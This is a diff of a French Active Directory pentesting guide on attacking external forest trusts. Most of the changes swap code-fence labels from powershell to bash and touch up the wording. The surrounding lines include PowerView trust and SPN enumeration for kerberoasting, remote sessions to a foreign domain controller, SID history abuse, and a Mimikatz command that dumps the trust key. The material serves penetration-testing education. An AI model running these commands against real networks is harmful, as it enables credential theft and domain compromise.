@@ -7,7 +7,7 @@ Dans ce scénario, un domaine externe vous fait confiance (ou les deux se font c
 ## Énumération
 
 Tout d'abord, vous devez **énumérer** la **confiance** :
-```powershell
+```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
 TargetName      : domain.external  --> Destination domain
@@ -60,10 +60,10 @@ Dans l'énumération précédente, il a été trouvé que l'utilisateur **`cross
 
 ## Accès Initial
 
-Si vous **ne pouviez pas** trouver d'**accès spécial** de votre utilisateur dans l'autre domaine, vous pouvez toujours revenir à la méthodologie AD et essayer de **privesc à partir d'un utilisateur non privilégié** (des choses comme le kerberoasting par exemple) :
+Si vous **ne pouviez pas** trouver d'accès **spécial** de votre utilisateur dans l'autre domaine, vous pouvez toujours revenir à la méthodologie AD et essayer de **privesc depuis un utilisateur non privilégié** (des choses comme le kerberoasting par exemple) :
 
 Vous pouvez utiliser les **fonctions Powerview** pour **énumérer** l'**autre domaine** en utilisant le paramètre `-Domain` comme dans :
-```powershell
+```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
 {{#ref}}
@@ -75,19 +75,19 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ### Connexion
 
 En utilisant une méthode régulière avec les identifiants des utilisateurs ayant accès au domaine externe, vous devriez pouvoir accéder à :
-```powershell
+```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### Abus de l'historique SID
 
-Vous pouvez également abuser de [**l'historique SID**](sid-history-injection.md) à travers une relation de confiance entre forêts.
+Vous pouvez également abuser de [**l'historique SID**](sid-history-injection.md) à travers une confiance de forêt.
 
 Si un utilisateur est **migré d'une forêt à une autre** et que **le filtrage SID n'est pas activé**, il devient possible d'**ajouter un SID de l'autre forêt**, et ce **SID** sera **ajouté** au **jeton de l'utilisateur** lors de l'authentification **à travers la confiance**.
 
 > [!WARNING]
 > En rappel, vous pouvez obtenir la clé de signature avec
 >
-> ```powershell
+> ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
